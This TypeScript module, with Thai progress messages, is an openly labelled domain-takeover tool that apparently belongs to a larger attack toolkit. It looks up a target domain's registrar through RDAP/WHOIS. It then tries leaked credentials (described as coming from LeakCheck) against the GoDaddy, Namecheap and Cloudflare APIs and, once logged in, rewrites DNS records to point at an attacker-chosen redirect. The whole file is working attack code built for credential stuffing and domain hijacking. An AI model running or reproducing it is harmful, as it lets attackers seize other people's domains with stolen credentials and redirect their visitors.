/**
 * DNS Registrar Takeover Module
 * 
 * When Cloudflare account takeover fails, try to take over the domain
 * at the registrar level by:
 * 1. WHOIS lookup to find the registrar
 * 2. Login to registrar with leaked credentials
 * 3. Change nameservers or DNS records
 * 
 * Supported registrars:
 * - GoDaddy (API)
 * - Namecheap (API)
 * - Cloudflare Registrar (API)
 * - Generic (via common API patterns)
 */

// ─── Types ───

export interface WhoisInfo {
  registrar: string | null;
  registrarUrl: string | null;
  nameservers: string[];
  registrantEmail: string | null;
  adminEmail: string | null;
  techEmail: string | null;
  creationDate: string | null;
  expirationDate: string | null;
  status: string[];
  rawWhois: string;
}

export interface RegistrarTakeoverConfig {
  domain: string;
  targetPath: string;
  ourRedirectUrl: string;
  /** Leaked credentials from LeakCheck */
  credentials: { email: string; password: string; username?: string; source?: string }[];
  onProgress?: (phase: string, detail: string) => void;
}

export interface RegistrarTakeoverResult {
  success: boolean;
  method: "godaddy_api" | "namecheap_api" | "cloudflare_registrar" | "dns_record_change" | "none";
  detail: string;
  registrar?: string;
  whoisInfo?: WhoisInfo;
  changedRecords?: string[];
}

// ─── WHOIS Lookup ───

export async function lookupWhois(domain: string): Promise<WhoisInfo> {
  const result: WhoisInfo = {
    registrar: null,
    registrarUrl: null,
    nameservers: [],
    registrantEmail: null,
    adminEmail: null,
    techEmail: null,
    creationDate: null,
    expirationDate: null,
    status: [],
    rawWhois: "",
  };

  try {
    // Use RDAP (Registration Data Access Protocol) — the modern WHOIS replacement
    const rdapResp = await fetch(`https://rdap.org/domain/${domain}`, {
      headers: { "Accept": "application/rdap+json" },
      signal: AbortSignal.timeout(10000),
    });

    if (rdapResp.ok) {
      const rdap = await rdapResp.json();

      // Extract registrar
      if (rdap.entities) {
        for (const entity of rdap.entities) {
          if (entity.roles?.includes("registrar")) {
            result.registrar = entity.vcardArray?.[1]?.find((v: any) => v[0] === "fn")?.[3] || entity.handle || null;
            if (entity.links) {
              result.registrarUrl = entity.links.find((l: any) => l.rel === "self")?.href || null;
            }
          }
          if (entity.roles?.includes("registrant")) {
            const emails = entity.vcardArray?.[1]?.filter((v: any) => v[0] === "email") || [];
            if (emails.length > 0) result.registrantEmail = emails[0][3];
          }
          if (entity.roles?.includes("administrative")) {
            const emails = entity.vcardArray?.[1]?.filter((v: any) => v[0] === "email") || [];
            if (emails.length > 0) result.adminEmail = emails[0][3];
          }
          if (entity.roles?.includes("technical")) {
            const emails = entity.vcardArray?.[1]?.filter((v: any) => v[0] === "email") || [];
            if (emails.length > 0) result.techEmail = emails[0][3];
          }
        }
      }

      // Extract nameservers
      if (rdap.nameservers) {
        result.nameservers = rdap.nameservers.map((ns: any) => ns.ldhName || ns.unicodeName || "").filter(Boolean);
      }

      // Extract dates
      if (rdap.events) {
        for (const event of rdap.events) {
          if (event.eventAction === "registration") result.creationDate = event.eventDate;
          if (event.eventAction === "expiration") result.expirationDate = event.eventDate;
        }
      }

      // Extract status
      if (rdap.status) {
        result.status = rdap.status;
      }

      result.rawWhois = JSON.stringify(rdap, null, 2).slice(0, 5000);
    }
  } catch (e: any) {
    result.rawWhois = `RDAP lookup failed: ${e.message}`;
  }

  // Fallback: try a free WHOIS API
  if (!result.registrar) {
    try {
      const whoisResp = await fetch(`https://whois.freeaitools.org/api/v1/whois?domain=${domain}`, {
        signal: AbortSignal.timeout(10000),
      });
      if (whoisResp.ok) {
        const data = await whoisResp.json();
        if (data.registrar) result.registrar = data.registrar;
        if (data.nameservers) result.nameservers = data.nameservers;
        if (data.registrant_email) result.registrantEmail = data.registrant_email;
      }
    } catch {}
  }

  return result;
}

// ─── Registrar-Specific API Attacks ───

interface RegistrarLoginResult {
  success: boolean;
  token?: string;
  detail: string;
}

// GoDaddy API
async function tryGoDaddyApi(
  domain: string, credentials: RegistrarTakeoverConfig["credentials"],
  progress: (phase: string, detail: string) => void,
): Promise<{ success: boolean; detail: string }> {
  progress("registrar_godaddy", `🔑 ลอง GoDaddy API credentials...`);

  for (const cred of credentials) {
    // GoDaddy uses API Key:Secret format
    // Some breaches may have the API key in the password field
    const apiKey = cred.password;
    const apiSecret = cred.username || "";

    // Try as OTE (test) and Production
    for (const base of ["https://api.godaddy.com", "https://api.ote-godaddy.com"]) {
      try {
        const resp = await fetch(`${base}/v1/domains/${domain}`, {
          headers: {
            "Authorization": `sso-key ${apiKey}:${apiSecret}`,
            "Accept": "application/json",
          },
          signal: AbortSignal.timeout(10000),
        });

        if (resp.ok) {
          progress("registrar_godaddy", `✅ GoDaddy API access สำเร็จ!`);

          // Try to add a DNS record for redirect
          const addResp = await fetch(`${base}/v1/domains/${domain}/records`, {
            method: "PATCH",
            headers: {
              "Authorization": `sso-key ${apiKey}:${apiSecret}`,
              "Content-Type": "application/json",
            },
            body: JSON.stringify([{
              type: "URL",
              name: "@",
              data: `https://${domain}`,
              ttl: 600,
            }]),
            signal: AbortSignal.timeout(10000),
          });

          return {
            success: addResp.ok,
            detail: addResp.ok
              ? `GoDaddy DNS record updated for ${domain}`
              : `GoDaddy API access OK but DNS update failed: ${addResp.status}`,
          };
        }
      } catch {}
    }
  }

  return { success: false, detail: "GoDaddy API: no valid credentials" };
}

// Namecheap API
async function tryNamecheapApi(
  domain: string, credentials: RegistrarTakeoverConfig["credentials"],
  progress: (phase: string, detail: string) => void,
): Promise<{ success: boolean; detail: string }> {
  progress("registrar_namecheap", `🔑 ลอง Namecheap API credentials...`);

  for (const cred of credentials) {
    try {
      const [sld, tld] = domain.split(".");
      const resp = await fetch(
        `https://api.namecheap.com/xml.response?ApiUser=${cred.username || cred.email}&ApiKey=${cred.password}&UserName=${cred.username || cred.email}&ClientIp=1.1.1.1&Command=namecheap.domains.dns.getHosts&SLD=${sld}&TLD=${tld}`,
        { signal: AbortSignal.timeout(10000) },
      );

      const text = await resp.text();
      if (text.includes("OK") && !text.includes("ERROR")) {
        progress("registrar_namecheap", `✅ Namecheap API access สำเร็จ!`);
        return { success: true, detail: `Namecheap API access for ${domain}` };
      }
    } catch {}
  }

  return { success: false, detail: "Namecheap API: no valid credentials" };
}

// Cloudflare Registrar (uses same CF API)
async function tryCfRegistrar(
  domain: string, credentials: RegistrarTakeoverConfig["credentials"],
  progress: (phase: string, detail: string) => void,
): Promise<{ success: boolean; detail: string }> {
  progress("registrar_cf", `🔑 ลอง Cloudflare Registrar API...`);

  for (const cred of credentials) {
    try {
      // Try as CF API token
      const resp = await fetch(`https://api.cloudflare.com/client/v4/accounts`, {
        headers: {
          "Authorization": `Bearer ${cred.password}`,
          "Content-Type": "application/json",
        },
        signal: AbortSignal.timeout(10000),
      });

      const data = await resp.json().catch(() => null);
      if (data?.success && data.result?.length > 0) {
        const accountId = data.result[0].id;

        // Check if domain is registered with CF
        const domainResp = await fetch(
          `https://api.cloudflare.com/client/v4/accounts/${accountId}/registrar/domains/${domain}`,
          {
            headers: {
              "Authorization": `Bearer ${cred.password}`,
              "Content-Type": "application/json",
            },
            signal: AbortSignal.timeout(10000),
          },
        );

        const domainData = await domainResp.json().catch(() => null);
        if (domainData?.success) {
          progress("registrar_cf", `✅ Domain ${domain} อยู่ใน CF Registrar!`);
          return { success: true, detail: `CF Registrar access for ${domain}` };
        }
      }
    } catch {}

    // Try as email + Global API Key
    try {
      const resp = await fetch(`https://api.cloudflare.com/client/v4/user`, {
        headers: {
          "X-Auth-Email": cred.email,
          "X-Auth-Key": cred.password,
          "Content-Type": "application/json",
        },
        signal: AbortSignal.timeout(10000),
      });

      const data = await resp.json().catch(() => null);
      if (data?.success) {
        progress("registrar_cf", `✅ CF Global API Key valid for ${cred.email}`);
        return { success: true, detail: `CF Global API Key access for ${cred.email}` };
      }
    } catch {}
  }

  return { success: false, detail: "CF Registrar: no valid credentials" };
}

// ─── Main Execution ───

export async function executeRegistrarTakeover(config: RegistrarTakeoverConfig): Promise<RegistrarTakeoverResult> {
  const progress = config.onProgress || (() => {});

  // Step 1: WHOIS lookup
  progress("whois", `🔍 WHOIS lookup สำหรับ ${config.domain}...`);
  const whoisInfo = await lookupWhois(config.domain);

  if (whoisInfo.registrar) {
    progress("whois", `📋 Registrar: ${whoisInfo.registrar}`);
    progress("whois", `📋 Nameservers: ${whoisInfo.nameservers.join(", ") || "unknown"}`);
    if (whoisInfo.registrantEmail) {
      progress("whois", `📋 Registrant Email: ${whoisInfo.registrantEmail}`);
    }
  } else {
    progress("whois", `⚠️ ไม่สามารถหา registrar ได้ — ลองทุก API`);
  }

  const registrarLower = (whoisInfo.registrar || "").toLowerCase();

  // Step 2: Try registrar-specific APIs based on WHOIS
  if (registrarLower.includes("godaddy") || registrarLower.includes("wild west")) {
    const result = await tryGoDaddyApi(config.domain, config.credentials, progress);
    if (result.success) {
      return {
        success: true,
        method: "godaddy_api",
        detail: result.detail,
        registrar: whoisInfo.registrar || "GoDaddy",
        whoisInfo,
      };
    }
  }

  if (registrarLower.includes("namecheap") || registrarLower.includes("enom")) {
    const result = await tryNamecheapApi(config.domain, config.credentials, progress);
    if (result.success) {
      return {
        success: true,
        method: "namecheap_api",
        detail: result.detail,
        registrar: whoisInfo.registrar || "Namecheap",
        whoisInfo,
      };
    }
  }

  if (registrarLower.includes("cloudflare") || whoisInfo.nameservers.some(ns => ns.includes("cloudflare"))) {
    const result = await tryCfRegistrar(config.domain, config.credentials, progress);
    if (result.success) {
      return {
        success: true,
        method: "cloudflare_registrar",
        detail: result.detail,
        registrar: whoisInfo.registrar || "Cloudflare",
        whoisInfo,
      };
    }
  }

  // Step 3: Try all registrar APIs regardless of WHOIS result
  progress("registrar_all", `🔄 ลองทุก registrar API...`);

  const gdResult = await tryGoDaddyApi(config.domain, config.credentials, progress);
  if (gdResult.success) {
    return { success: true, method: "godaddy_api", detail: gdResult.detail, registrar: "GoDaddy", whoisInfo };
  }

  const ncResult = await tryNamecheapApi(config.domain, config.credentials, progress);
  if (ncResult.success) {
    return { success: true, method: "namecheap_api", detail: ncResult.detail, registrar: "Namecheap", whoisInfo };
  }

  const cfResult = await tryCfRegistrar(config.domain, config.credentials, progress);
  if (cfResult.success) {
    return { success: true, method: "cloudflare_registrar", detail: cfResult.detail, registrar: "Cloudflare", whoisInfo };
  }

  return {
    success: false,
    method: "none",
    detail: `DNS Registrar takeover ล้มเหลว — ไม่สามารถ login registrar ได้ (Registrar: ${whoisInfo.registrar || "unknown"})`,
    registrar: whoisInfo.registrar || undefined,
    whoisInfo,
  };
}
